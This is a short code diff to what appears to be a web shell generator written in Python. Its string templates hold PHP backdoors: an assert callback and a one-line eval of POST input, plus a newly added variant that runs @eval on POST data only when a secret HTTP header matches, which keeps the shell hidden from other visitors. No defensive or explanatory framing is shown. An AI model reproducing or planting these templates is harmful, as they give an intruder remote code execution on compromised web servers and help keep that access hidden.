@@ -24,6 +24,11 @@ PHP_CALLBACK = """array_map("assert",(array)$_POST["{{PASSWORD}}"]);"""
 
 PHP_ONE_LINER = """eval($_POST[{{PASSWORD}}]);"""
 
+PHP_WITH_AUTH = """$authHeader = isset($_SERVER['HTTP_{{SECRET_HEADER}}']) ? $_SERVER['HTTP_{{SECRET_HEADER}}'] : '';
+if($authHeader === '{{SECRET_VALUE}}'){
+    @eval($_POST["{{PASSWORD}}"]);
+}"""
+
 
 PHP_TEMPLATES = {
     "default": PHP_DEFAULT,
